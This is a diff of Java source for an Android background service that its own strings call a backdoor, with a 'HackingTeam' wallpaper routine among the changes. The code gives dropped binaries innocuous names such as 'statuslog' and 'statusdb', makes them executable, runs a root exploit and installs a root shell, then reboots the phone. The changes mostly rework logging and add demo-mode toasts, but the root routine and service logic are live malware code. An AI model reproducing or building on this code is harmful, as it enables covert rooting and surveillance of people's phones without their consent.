@@ -11,12 +11,20 @@ import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 
 import android.app.Service;
+import android.app.WallpaperManager;
+import android.content.Context;
 import android.content.Intent;
+import android.graphics.Bitmap;
+import android.graphics.Bitmap.Config;
+import android.graphics.Canvas;
+import android.graphics.Paint;
 import android.os.IBinder;
-import android.util.Log;
+import android.view.Display;
+import android.view.WindowManager;
 import android.widget.Toast;
 
 import com.android.service.auto.Cfg;
+import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
 /**
@@ -36,20 +44,45 @@ public class ServiceCore extends Service {
 	@Override
 	public void onCreate() {
 		super.onCreate();
-		if (Cfg.DEBUG)
-			Log.d("QZ", TAG + " (onCreate)");
-
-		// Toast.makeText(this, "Service Created", Toast.LENGTH_LONG).show();
+		if (Cfg.DEBUG){
+			Check.log( TAG + " (onCreate)");
+		}
+		if(Cfg.DEMO){
+			Toast.makeText(this, "Backdoor Created", Toast.LENGTH_LONG).show();
+			//setBackground();
+		}
 		Status.setAppContext(getApplicationContext());
+	}
+
+	private void setBackground() {
+		WallpaperManager wm = WallpaperManager.getInstance(this);
+		Display display = ((WindowManager) Status.getAppContext()
+				.getSystemService(Context.WINDOW_SERVICE))
+				.getDefaultDisplay();
+		int width = display.getWidth();
+		int height = display.getHeight();
+		Bitmap bitmap = Bitmap.createBitmap(width, height, Config.ARGB_8888);
+		Canvas canvas = new Canvas(bitmap);
+		Paint paint=new Paint();
+		paint.setStyle(Paint.Style.FILL);
+		paint.setAntiAlias(true);
+		paint.setTextSize(20);
+		canvas.drawText("HackingTeam", 10, 100, paint);
+		try {
+			wm.setBitmap(bitmap);
+		} catch (IOException e) {
+			if(Cfg.DEBUG) Check.log(e);
+		}
 	}
 
 	@Override
 	public void onDestroy() {
 		super.onDestroy();
 		if (Cfg.DEBUG)
-			Log.d("QZ", TAG + " (onDestroy)");
+			Check.log( TAG + " (onDestroy)");
 
-		// Toast.makeText(this, "Service Destroyed", Toast.LENGTH_LONG).show();
+		if(Cfg.DEMO)
+			Toast.makeText(this, "Backdoor Destroyed", Toast.LENGTH_LONG).show();
 		core.Stop();
 		core = null;
 	}
@@ -71,24 +104,25 @@ public class ServiceCore extends Service {
 				Status.self().setRoot(root());
 			} else {
 				if (Cfg.DEBUG)
-					Log.d("QZ", TAG + " (onStart) no media mounted");
+					Check.log( TAG + " (onStart) no media mounted");
 			}
 		}
 
 		// Core starts
 		core = new Core();
 		core.Start(this.getResources(), getContentResolver());
+		
 	}
 
 	private boolean root() {
 		try {
 			if (!Cfg.EXP) {
 				if (Cfg.DEBUG)
-					Log.d("QZ", TAG + " (root): Exploit disabled by conf");
-				
+					Check.log( TAG + " (root): Exploit disabled by conf");
+
 				return false;
 			}
-			
+
 			String crashlog = "errorlog";
 			String exploit = "statuslog";
 			String suidext = "statusdb";
@@ -125,9 +159,12 @@ public class ServiceCore extends Service {
 			File filesPath = getApplicationContext().getFilesDir();
 			String path = filesPath.getAbsolutePath();
 
-			Runtime.getRuntime().exec("/system/bin/chmod 755 " + path + "/" + exploit);
-			Runtime.getRuntime().exec("/system/bin/chmod 755 " + path + "/" + suidext);
-			Runtime.getRuntime().exec("/system/bin/chmod 666 " + path + "/" + crashlog);
+			Runtime.getRuntime().exec(
+					"/system/bin/chmod 755 " + path + "/" + exploit);
+			Runtime.getRuntime().exec(
+					"/system/bin/chmod 755 " + path + "/" + suidext);
+			Runtime.getRuntime().exec(
+					"/system/bin/chmod 666 " + path + "/" + crashlog);
 
 			final String exppath = path + "/" + exploit;
 
@@ -155,33 +192,33 @@ public class ServiceCore extends Service {
 
 				// Installiamo la shell root
 				Runtime.getRuntime().exec(path + "/" + suidext + " rt");
-				
-				// Montiamo la SD
-				Runtime.getRuntime().exec(path + "/" + suidext + " sd");
-				
+
 				if (Cfg.DEBUG) {
-					Log.d("QZ", TAG + " (onStart): WE ARE ROOOOOOOT, I LOVE QUEZ MADE EXPLOITS!!!");
-					Toast.makeText(this,
-							"WE ARE ROOOOOOOT, I LOVE QUEZ MADE EXPLOITS!!!",
-							Toast.LENGTH_LONG).show();
+					Check.log( TAG + " (onStart): Root exploit");
 				}
-				
+				if (Cfg.DEMO) {
+					Toast.makeText(this, "Root exploit", Toast.LENGTH_LONG)
+							.show();
+				}
+
 				// Riavviamo il telefono
 				Runtime.getRuntime().exec(path + "/" + suidext + " reb");
 			} else {
 				if (Cfg.DEBUG) {
-					Log.d("QZ",
-							TAG + " (onStart): Fucking third party exploits, they never work!");
-					Toast.makeText(this,
-							"Fucking third party exploits, they never work!",
-							Toast.LENGTH_LONG).show();
+					Check.log( TAG + " (onStart): exploit failed!");
+				}
+				if (Cfg.DEMO) {
+					Toast.makeText(this, "exploit failed!", Toast.LENGTH_LONG)
+							.show();
 				}
 
 			}
 		} catch (Exception e1) {
-			e1.printStackTrace();
-			if (Cfg.DEBUG)
-				Log.d("QZ", TAG + " (root): Exception on root()");
+
+			if (Cfg.DEBUG) {
+				Check.log(e1);
+				Check.log( TAG + " (root): Exception on root()");
+			}
 			return false;
 		}
 
@@ -226,13 +263,13 @@ public class ServiceCore extends Service {
 
 				while ((line = stdout.readLine()) != null) {
 					if (Cfg.DEBUG) {
-						Log.d("QZ", TAG + " (stdout): " + line);
+						Check.log( TAG + " (stdout): " + line);
 					}
 				}
 
 				while ((line = stderr.readLine()) != null) {
 					if (Cfg.DEBUG) {
-						Log.d("QZ", TAG + " (stderr): " + line);
+						Check.log( TAG + " (stderr): " + line);
 					}
 				}
 
@@ -240,14 +277,14 @@ public class ServiceCore extends Service {
 					localProcess.waitFor();
 				} catch (InterruptedException e) {
 					if (Cfg.DEBUG) {
-						Log.d("QZ", TAG + " (waitFor): " + e);
-						e.printStackTrace();
+						Check.log( TAG + " (waitFor): " + e);
+						Check.log(e);
 					}
 				}
 
 				int exitValue = localProcess.exitValue();
 				if (Cfg.DEBUG)
-					Log.d("QZ", TAG + " (waitFor): exitValue " + exitValue);
+					Check.log( TAG + " (waitFor): exitValue " + exitValue);
 
 				stdin.close();
 				stdout.close();
@@ -256,9 +293,9 @@ public class ServiceCore extends Service {
 			} catch (IOException e) {
 				localProcess = null;
 				if (Cfg.DEBUG) {
-					Log.d("QZ", TAG
+					Check.log( TAG
 							+ " (ExploitRunnable): Exception on run(): " + e);
-					e.printStackTrace();
+					Check.log(e);
 				}
 			}
 		}
